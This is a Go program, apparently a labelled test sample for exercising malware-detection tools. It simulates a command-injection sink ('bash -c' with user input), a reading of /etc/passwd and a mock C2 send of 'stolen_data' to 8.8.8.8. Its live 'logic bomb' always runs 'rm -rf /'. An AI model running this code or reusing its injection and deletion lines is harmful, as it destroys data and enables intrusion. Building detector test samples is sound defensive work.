package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

func main() {
	fmt.Println("--- Go 恶意模拟开始 ---")

	patternTest()

	if len(os.Args) > 1 {
		taintTest(os.Args[1])
	}

	logicBomb()
	stealFile()
	connectC2()

	fmt.Println("--- 模拟结束 ---")
}

// --- 【对应静态分析 a: 模式匹配】 ---
// 使用 Base64 解码，试图隐藏恶意意图
func patternTest() {
	payload := "aGFja2Vk" // "hacked"
	decoded, _ := base64.StdEncoding.DecodeString(payload)
	fmt.Println("Decoded:", string(decoded))
}

// --- 【对应静态分析 b & d: 数据流与污点分析】 ---
// 接收命令行参数 -> 传入 exec.Command
func taintTest(userInput string) {
	// Sink: 危险函数，直接执行 Shell 命令
	// SAST 应检测到 os.Args 流入 exec.Command
	cmd := exec.Command("bash", "-c", "echo "+userInput)
	cmd.Run()
}

// --- 【对应静态分析 c: 控制流分析】 ---
// 隐藏在条件分支里的恶意代码
func logicBomb() {
	// 简单的逻辑判断
	if time.Now().Year() < 2000 {
		return
	} else {
		// 恶意代码路径
		// 试图执行危险删除操作
		exec.Command("rm", "-rf", "/").Run()
	}
}

// --- 【对应动态分析 a & c: 系统调用 & 文件监控】 ---
// 模拟读取 /etc/passwd
func stealFile() {
	fmt.Println("[*] 正在尝试读取敏感文件...")
	// 触发 open/read 系统调用
	// 你的 Windows Hook 应该能拦截到对应的 CreateFile/ReadFile (如果是在Win上跑)
	// 或者 Linux 的 openat
	content, err := os.ReadFile("/etc/passwd")
	if err == nil {
		_ = content // 假装使用了数据
	}
}

// --- 【对应动态分析 b: 网络活动监控】 ---
// 模拟 C2 连接
func connectC2() {
	fmt.Println("[*] 正在回传数据...")
	// 触发 socket/connect 系统调用
	conn, err := net.Dial("tcp", "8.8.8.8:53")
	if err == nil {
		conn.Write([]byte("stolen_data"))
		conn.Close()
	}
}